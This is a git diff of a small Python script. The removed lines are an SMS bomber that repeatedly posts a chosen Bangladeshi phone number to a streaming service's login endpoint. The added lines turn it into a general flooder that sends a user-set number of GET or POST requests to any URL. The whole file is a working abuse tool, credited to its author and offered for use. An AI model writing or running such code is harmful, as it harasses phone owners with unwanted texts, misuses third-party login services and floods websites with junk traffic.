@@ -1,18 +1,25 @@
 import requests
 
 
+url = str(input("★ Give The Site Search URL:"))
 
+svlu = str(input("★ Enter Search Keyword:"))
 
-url = 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en'
+amn = int(input(" ★ Enter Amount Of Request: "))
 
-nmbr = str(input(" ★ Enter Number (01XXX): "))
+rmt = int(input("★ Select Request Method (get = 1 /post = 2)"))
 
+value = {"number": svlu}
 
-amn = int(input(" ★ Enter Amount Of SMS: "))
-
-value = {"number":"+88"+nmbr}
-
-
-for i in range(amn):
-    requests.post(url, data=value)
-    print(str(i+1)+" SMS SEND SUCCESSFULLY (°-°) DV: HOX**R - TALHA")
+if(rmt == 1):
+          for i in range(amn):
+    
+                  requests.get(url, data=value)
+                  print(str(i+1)+" Requests SEND SUCCESSFULLY (°-°) DV: HOX**R - TALHA - Get")
+         
+if(rmt == 2):
+         for i in range(amn):
+    
+                 requests.post(url, data=value)
+                 print(str(i+1)+" Requests SEND SUCCESSFULLY (°-°) DV: HOX**R - TALHA - Post")
+         
